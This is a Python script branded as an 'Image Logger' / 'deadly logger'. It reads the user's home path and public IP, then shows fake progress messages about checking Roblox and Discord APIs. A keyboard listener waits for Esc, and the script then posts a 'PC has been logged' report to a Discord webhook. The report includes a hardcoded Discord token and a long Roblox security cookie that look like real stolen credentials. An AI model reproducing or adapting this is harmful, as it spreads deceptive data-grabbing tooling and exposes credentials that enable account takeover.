from colorama import *
from pystyle import *
from time import sleep as s
import requests
import os
from pynput import keyboard

name = os.path.expanduser("~")
ip = requests.get("https://api.ipify.org/")


logo = '''
██╗██████╗  ██████╗ ███╗   ██╗ ██████╗ ██████╗
██║██╔══██╗██╔═══██╗████╗  ██║██╔════╝██╔════╝
██║██████╔╝██║   ██║██╔██╗ ██║██║     ██║     
██║██╔══██╗██║   ██║██║╚██╗██║██║     ██║     
██║██║  ██║╚██████╔╝██║ ╚████║╚██████╗╚██████╗
╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ 

         press enter to continue ...'''
Anime.Fade(Center.Center(logo), Colors.black_to_red, Colorate.Horizontal, interval=0.035, enter=True)

logo2 = '''
██╗██████╗  ██████╗ ███╗   ██╗ ██████╗ ██████╗
██║██╔══██╗██╔═══██╗████╗  ██║██╔════╝██╔════╝
██║██████╔╝██║   ██║██╔██╗ ██║██║     ██║     
██║██╔══██╗██║   ██║██║╚██╗██║██║     ██║     
██║██║  ██║╚██████╔╝██║ ╚████║╚██████╗╚██████╗
╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ 
                Image Logger'''
print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(logo2)))


hook = input(Fore.YELLOW + "\n <~> enter your webhook : ")
print(Fore.RED + "Checking Webhook ...")
s(2)
im = input(Fore.YELLOW + "<~> enter your image link : ")
print(Fore.RED + "Copying image ...")
s(2)
print(Fore.RED + "checking rolox, disocrd apis ...")
s(2)
print(Fore.GREEN + "Tasks done successfully sending image, Please wait..")
s(5)
data = {
    "embeds": [
        {
            "color": 10038562,
            "author": {
                "name": "</> deadly logger </> "
            },
            "description": "Here is your image:",
            "image": {
                "url": f"{im}"
            }
        }
    ]
}
requests.post(hook, json=data)
data2 = {
    "embeds": [
        {
            "color": 10038562,
            "author": {
                "name": "</> deadly logger </> "
            },
            "description": f"A PC has been logged 😋 ``{name}`` \n\n Grabbed IP address ✈: ``{ip.text}`` \n \n Discord token ❄: ``MTE2NzQ3MTY1Njc1NTc5ODEyOA.G-gGhu.JJXmcfe2ocFqTPZi9ovHiv7xtl4IzhsqFBM2Rs`` \n\n Roblox cookies 🍪: ```_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_571771B98D77D1E9F39CA56C995121CAAA57257770A3B39804918557DC2FE9EB0695C7EAAA80FE5D4FB2E4BDDF2A0F6CCFCAA791EC440801B104F107BE4852063CB9D8DC77BC9A8B1E54708A7287786A46E057637FD0D04EC33CDA39328370B9BF15386BEE6FCA86796A28367B142D3AB284A26201133EF4FA44DEA96804B95B157593E26B003C8C3D8500DE4531D653F8732A11EE6F0E4F6C42F22F5EDC36C2EFAF5E523D9707C52207F93A7E10BF4618114FB50629F0BCC9F94F6A4B69FF16DB3E54805F0689BF5D161CDB938ECA5B505FF42F4205EC4673C73DB897839C11A36F72557B4739C72155AB72B7E66F46D42F211294ACC6B80F270D5C2FEDBB4551849F73A539BD58246CF6C70AB782E9643D1274C40C1DC22B18D3ABBC20A57EFABB57EEFD524FC2717CBB2B3EFF9F25C511DD09627C10159FE35BB059CE8D19A04BE096F336A9AEF02470EA55970D52378D5990A7C9C31970209A834E1FAA02488816A1A7837635C61D4F86EE9B8689424D50BFC68BCFC5E8D1E2372F3E634C4D1E3C8B4481A4FDB0978A7BFAF8DB5CB125DE07E307E20CC1820EABFF2FBF23CD1480776C52CAA8FEC3178C33D4538D0222C16B2CEA9E458DBF0F9FF520A059FC6C9F186463B3A0CF93A5F5878E9D6BD5F6391BCFD0465565AE891C5077765B7037631B54AB2BE38DFEC00F44FB8055F9448D2B7BAA5195A37A7CB58439A758BB7A6558FBC9C042B022C9C21B59EEB8A442213DF815E55E26D90369F0C6C286D6731E30B68BA4D46AD1E3B2027FC822789B2B6334A3665D55AE1B8E5C0D4E1409950BD4C3052C32807D71AF8228A309C167B521DB094A1BE50B2E5E6B8A5E11E15062015420409650F635E9395647B0D279B8163E280048397BCBA18C6C08E21B856E1E33F1DFA5D15B02E7364616BA63940443EB093E7DB5524764DC6C9628030BB0D54937D6BD273A947A1066AF3ECDE834E528E1FA1F2247FCD27AC57F98ABC2564562CDF07992C1DCE210ADDA3E06C0D8836D4576D716353D134F0FF62CD67D6DCB65A1E49AA39E5FFC2AEA2B8AE87940B5```",
            "image": {
                "url": f""
            }
        }
    ]
}


def on_press(key):
    if key == keyboard.Key.esc:
        requests.post(hook, json=data2)

listener = keyboard.Listener(on_press=on_press)
listener.start()

listener.join()